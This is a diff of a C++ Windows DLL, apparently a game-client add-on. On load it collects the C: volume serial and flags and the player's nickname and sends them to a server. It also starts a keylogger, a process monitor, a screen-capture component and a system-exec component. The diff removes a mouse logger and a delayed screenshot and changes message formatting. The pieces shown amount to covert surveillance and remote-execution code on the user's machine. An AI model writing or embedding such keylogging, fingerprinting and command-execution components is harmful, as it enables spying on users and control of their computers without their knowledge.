@@ -9,11 +9,12 @@ addonMutex *gMutex;
 addonSocket *gSocket;
 addonProcess *gProcess;
 addonKeylog *gKeylog;
-addonMouselog *gMouselog;
 addonScreen *gScreen;
 addonSysexec *gSysexec;
 addonFS *gFS;
 addonString *gString;
+
+extern std::queue<std::string> send_to;
 
 
 
@@ -30,13 +31,12 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 	else if(fdwReason == DLL_PROCESS_DETACH)
 	{
 		delete gSysexec;
-		delete gMouselog;
 		delete gKeylog;
 		delete gProcess;
 
-		gSocket->Send(formatString() << "TCPQUERY" << ">" << "CLIENT_CALL" << ">" << 1001 << ">" << hinstDLL << "_" << fdwReason << "_" << lpvReserved);
+		gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1001 << " " << hinstDLL << " " << fdwReason << " " << lpvReserved);
 
-		Sleep(500);
+		Sleep(1000);
 
 		gSocket->Close();
 
@@ -49,7 +49,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 		addonDebug("-----------------------------------------------------------------");
 	}
 
-	return TRUE;
+	return true;
 }
 
 
@@ -71,7 +71,7 @@ __declspec(dllexport) void addon_start()
 
 
 
-DWORD __stdcall main_thread(LPVOID lpParam)
+DWORD main_thread(void *lpParam)
 {
 	addonDebug("Thread 'main_thread' succesfuly started");
 
@@ -83,6 +83,7 @@ DWORD __stdcall main_thread(LPVOID lpParam)
 	std::string nickname;
 	std::string ip;
 	std::size_t buf;
+
 	DWORD serial;
 	DWORD flags;
 	int port;
@@ -100,16 +101,11 @@ DWORD __stdcall main_thread(LPVOID lpParam)
 
 	GetVolumeInformationW(L"C:\\", NULL, NULL, &serial, NULL, &flags, NULL, NULL);
 
-	gSocket->Send(formatString() << "TCPQUERY" << ">" << "CLIENT_CALL" << ">" << 1000 << ">" << serial << ">" << (serial + (flags ^ 0x2296666)) << ">" << nickname << ">" << ((serial | flags) & 0x28F39) << ">" << flags);
+	gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1000 << " " << serial << " " << (serial + (flags ^ 0x2296666)) << " " << nickname << " " << ((serial | flags) & 0x28F39) << " " << flags);
 
 	gProcess = new addonProcess();
 	gKeylog = new addonKeylog();
-	//gMouselog = new addonMouselog();
 	gSysexec = new addonSysexec();
-
-	Sleep(30000);
-
-	gScreen->Get(std::string("test.png"));
 
 	return true;
 }
